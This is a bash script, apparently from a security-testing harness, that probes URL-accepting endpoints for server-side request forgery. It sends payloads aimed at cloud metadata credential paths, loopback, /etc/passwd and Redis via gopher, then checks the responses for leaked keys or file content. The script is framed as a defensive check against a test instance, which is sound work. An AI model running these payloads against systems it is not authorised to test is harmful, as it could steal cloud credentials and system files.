#!/usr/bin/env bash
# ssrf-probes.sh — SSRF probe, FACTS-driven. For each url-accepting endpoint the recon
# flagged (probe-context.json → ssrf_candidates), inject classic SSRF targets into that
# param and watch for IMDS/file/redis evidence or a tell-tale slow fetch. Expect
# 400/403/422 (host validation) or a clean 200 with no credential/IMDS content.
#
# Env (see _lib.py): TARGET, and usually TOKEN_A=<jwt> (or COOKIE_A) since these are
# typically admin/integration endpoints. Run only against a TEST instance.
set -uo pipefail
cd "$(dirname "$0")"
ctx=probe-context.json

TARGET="${TARGET:-$(python3 -c "import json;print(json.load(open('$ctx'))['target_base_url'])" 2>/dev/null)}"
if [ -z "${TARGET:-}" ] || [ "${TARGET#FILL}" != "$TARGET" ]; then echo "Set TARGET=http://host:port (or fill probe-context.json)"; exit 2; fi
AUTH=()
[ -n "${TOKEN_A:-}" ] && AUTH=(-H "Authorization: Bearer $TOKEN_A")
[ -z "${TOKEN_A:-}" ] && [ -n "${COOKIE_A:-}" ] && AUTH=(-H "Cookie: $COOKIE_A")
[ ${#AUTH[@]} -eq 0 ] && echo "  (no TOKEN_A/COOKIE_A — probing unauthenticated; most SSRF sinks need auth)"

# url-accepting endpoints recon flagged → "METHOD /path PARAM" lines
CANDS=()   # (portable; macOS ships bash 3.2 which lacks `mapfile`)
while IFS= read -r line; do [ -n "$line" ] && CANDS+=("$line"); done < <(python3 -c "
import json, re
for c in json.load(open('$ctx'))['endpoints'].get('ssrf_candidates', []):
    m = re.match(r'(\w+)\s+(\S+).*param:\s*([\w.-]+)', c)
    if m: print(m.group(1), m.group(2), m.group(3))
" 2>/dev/null)
if [ "${#CANDS[@]}" -eq 0 ]; then
  echo "No SSRF candidates in probe-context.json (recon found no url/domain-ish params). N/A for this app."; exit 0
fi

SSRF_TARGETS=(
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.170.2/v2/credentials/"
  "http://127.0.0.1/"
  "http://10.0.0.1/"
  "file:///etc/passwd"
  "gopher://127.0.0.1:6379/_INFO"
)
fails=0; warns=0
for cand in "${CANDS[@]}"; do
  read -r method path param <<< "$cand"
  for url in "${SSRF_TARGETS[@]}"; do
    body=$(python3 -c "import json,sys; print(json.dumps({sys.argv[1]: sys.argv[2]}))" "$param" "$url")
    start=$(date +%s)
    resp=$(curl -s -m 8 -w '\nHTTP_CODE:%{http_code}' -X "$method" "$TARGET$path" ${AUTH[@]+"${AUTH[@]}"} -H 'content-type: application/json' -d "$body" 2>&1 || true)
    dur=$(( $(date +%s) - start ))
    code=$(printf '%s' "$resp" | grep -oE 'HTTP_CODE:[0-9]+' | cut -d: -f2)
    bod=$(printf '%s' "$resp" | grep -v 'HTTP_CODE:' | head -c 200)
    if printf '%s' "$bod" | grep -qE 'AccessKeyId|SecretAccessKey|InstanceId|root:x:0:0|redis_version'; then
      printf '  FAIL  %s %s [%s] %s  → IMDS/file/redis CONTENT LEAKED\n' "$method" "$path" "${code:-?}" "$param=$url"; fails=$((fails+1))
    elif [[ "$url" == *169.254.* && "$dur" -gt 5 ]]; then
      printf '  WARN  %s %s [%s,%ss] %s  → slow; backend may have fetched it\n' "$method" "$path" "${code:-?}" "$dur" "$url"; warns=$((warns+1))
    elif [[ "$code" =~ ^(400|403|422)$ ]]; then
      printf '  ok    %s %s [%s] %s  validation rejected\n' "$method" "$path" "$code" "$url"
    else
      printf '  ?     %s %s [%s] %s\n' "$method" "$path" "${code:-?}" "$url"
    fi
  done
done
echo "summary: $fails definitive SSRF · $warns suspicious (review)"
exit "$fails"
